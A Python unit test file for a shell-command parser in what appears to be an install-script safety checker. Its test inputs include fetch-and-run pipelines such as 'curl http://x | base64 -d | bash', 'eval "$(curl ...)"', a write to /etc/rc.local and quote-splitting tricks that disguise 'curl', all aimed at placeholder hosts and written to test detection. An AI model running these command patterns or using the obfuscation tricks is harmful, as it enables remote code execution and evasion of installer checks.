"""Unit tests: structured shell tokenizer and parser."""
from cex_installguard import shellparser as sp


def _cmds(text):
    return [c for _, _, c in sp.walk_statements(sp.parse(text))]


def _one(text):
    cmds = _cmds(text)
    assert cmds, f'expected at least one command in {text!r}'
    return cmds[0]


# -- tokenizing basics ------------------------------------------------------ #

def test_simple_command():
    c = _one('curl -sL https://x.invalid/a')
    assert c.name == 'curl'
    assert c.args() == ['-sL', 'https://x.invalid/a']


def test_quoted_words_marked():
    c = _one('rm -rf "$SAFE_DIR"')
    assert c.name == 'rm'
    assert c.words[2].quoted is True
    assert c.words[1].quoted is False


def test_adjacent_quote_segments_merge():
    # "cu""rl" is a single word in shell
    c = _one('"cu""rl" http://x.invalid')
    assert c.name == 'curl', c.words[0].text


def test_backslash_splitting():
    c = _one('cu\\rl http://x.invalid')
    assert c.name == 'curl'


def test_line_continuation():
    c = _one('curl \\\n  -s \\\n  http://x.invalid')
    assert c.name == 'curl'
    assert c.args() == ['-s', 'http://x.invalid']


def test_comments_ignored():
    cmds = _cmds('# a comment\ncurl http://x  # trailing\necho hi')
    assert [c.name for c in cmds] == ['curl', 'echo']


def test_hash_inside_word_is_literal():
    c = _one('echo a#b')
    assert c.args() == ['a#b']


def test_single_quotes_preserve_everything():
    c = _one("echo '$HOME and `cmd` and \\n'")
    assert c.args() == ['$HOME and `cmd` and \\n']


def test_double_quotes_allow_expansions():
    c = _one('echo "$HOME"')
    assert c.words[1].vars == ['HOME']
    assert c.words[1].quoted is True


# -- pipelines and sequences -------------------------------------------------- #

def test_pipeline_commands():
    pl = sp.parse('curl http://x | base64 -d | bash')[0].nodes[0]
    assert isinstance(pl, sp.Pipeline)
    assert [c.name for c in pl.commands] == ['curl', 'base64', 'bash']


def test_and_joiner():
    stmt = sp.parse('chmod +x /tmp/x && /tmp/x')[0]
    assert len(stmt.nodes) == 2
    assert stmt.joiners == ['&&']


def test_statement_per_line():
    stmts = sp.parse('echo one\necho two\necho three')
    assert len(stmts) == 3


def test_semicolon_separator():
    stmts = sp.parse('echo one; echo two')
    assert len(stmts) == 2


# -- assignments -------------------------------------------------------------- #

def test_plain_assignment_statement():
    stmts = sp.parse('URL="https://x.invalid"')
    c = stmts[0].nodes[0].commands[0]
    assert c.assignments == [] or c.assignments[0][0] == 'URL'
    assert not c.words


def test_assignment_with_cmdsub():
    c = _one('DATA=$(curl -s http://x.invalid)')
    assert c.assignments and c.assignments[0][0] == 'DATA'
    value = c.assignments[0][1]
    assert value.cmdsubs == ['curl -s http://x.invalid']


def test_assignment_prefix():
    c = _one('VAR=1 curl http://x.invalid')
    assert c.name == 'curl'
    assert c.assignments[0][0] == 'VAR'


def test_export_keeps_args():
    c = _one('export KEY="secret"')
    assert c.name == 'export'
    assert c.args() == ['KEY=secret']


# -- redirections -------------------------------------------------------------- #

def test_output_redirect():
    c = _one('curl http://x > /tmp/out')
    assert c.redirects[0].op == '>'
    assert c.redirects[0].target.text == '/tmp/out'


def test_fd_redirect():
    c = _one('echo boom 2> /dev/null')
    assert any(r.op == '2>' for r in c.redirects)


def test_append_redirect():
    c = _one('echo x >> /etc/rc.local')
    assert c.redirects[0].op == '>>'
    assert c.redirects[0].target.text == '/etc/rc.local'


def test_flag_value_extraction():
    c = _one('curl -o /tmp/tool http://x.invalid')
    vals = c.flag_values(('-o', '--output'))
    assert [v.text for v in vals] == ['/tmp/tool']


# -- subshells and substitutions ------------------------------------------------ #

def test_subshell_group():
    stmts = sp.parse('(cd /tmp && curl http://x | sh)')
    group = stmts[0].nodes[0]
    assert isinstance(group, sp.Group)
    inner = [c for _, _, c in sp.walk_statements(group.body)]
    assert [c.name for c in inner] == ['cd', 'curl', 'sh']


def test_cmdsub_word_segments():
    c = _one('eval "$(curl -s http://x.invalid)"')
    assert c.name == 'eval'
    assert c.words[1].cmdsubs


def test_backtick_substitution():
    c = _one('echo `curl -s http://x`')
    assert c.words[1].cmdsubs == ['curl -s http://x']


def test_nested_cmdsub():
    c = _one('eval "$(echo $(curl http://x))"')
    assert c.words[1].cmdsubs


# -- heredocs and tolerance ------------------------------------------------------ #

def test_heredoc_body_captured():
    c = _one('cat <<EOF > /tmp/x\nline one\nline two\nEOF')
    assert c.redirects[0].op == '<<'
    assert c.redirects[0].heredoc_tag == 'EOF'
    assert 'line one' in c.redirects[0].heredoc_body
    assert c.redirects[1].op == '>'


def test_unterminated_quote_tolerated():
    # must not raise; still yields the word
    c = _one('echo "unterminated')
    assert c.name == 'echo'


def test_unterminated_cmdsub_tolerated():
    c = _one('echo $(curl http://x')
    assert c.name == 'echo'


def test_empty_and_whitespace():
    assert sp.parse('') == []
    assert sp.parse('\n\n   \n\t\n') == []


def test_garbage_never_raises():
    for junk in (';;;;', '&&&', '|||', '(((', ')))', '$$$', '``', '\\',
                 '"\'', 'a | | b', '<<', '<<EOF', '$(', '${'):
        sp.parse(junk)   # must not raise


def test_command_name_path_stripped():
    c = _one('/usr/bin/curl http://x.invalid')
    assert c.name == 'curl'
